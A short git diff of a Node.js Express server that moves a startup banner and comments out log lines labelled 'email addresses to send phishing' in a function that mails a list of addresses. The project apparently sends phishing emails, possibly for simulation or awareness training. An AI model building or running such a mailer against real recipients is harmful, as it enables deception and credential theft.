@@ -13,10 +13,6 @@ const io = socketIo(server);
 // Configure Express to serve static files from the root directory
 app.use(express.static(__dirname));
 const PORT = 3100;
-
-
-
-server.listen(PORT, () => {
     console.log(`
       _             _     ______              ____   _____              _            _   _       _     
      | |           | |   |  ____|            |___ \\ / ____|            | |          | | (_)     | |    
@@ -27,7 +23,10 @@ server.listen(PORT, () => {
                                                                                                        
                                                                                                        
 `);
-    console.log(`Server running on http://localhost:${PORT}/login.html`);
+
+
+server.listen(PORT, () => {
+    console.log(`Server running on http://essse3:${PORT}/login.html  (or http://localhost:${PORT}/login.html)`);
 });
 
 app.get('/favicon.ico', (req, res) => res.status(204));
@@ -180,11 +179,11 @@ function writeDataToFile(filePath, data) {
 function sendMail(toBeSend)
 {
     if (typeof toBeSend === 'string') {
-        console.log("email addresses to send phishing: ", toBeSend);
+        //console.log("email addresses to send phishing: ", toBeSend);
         sendSingleMail(toBeSend);
     } 
     else if (Array.isArray(toBeSend)) {
-        console.log("email addresses to send phishing: ", toBeSend);
+        //console.log("email addresses to send phishing: ", toBeSend);
         toBeSend.forEach(item => {
             sendSingleMail(item);
         });
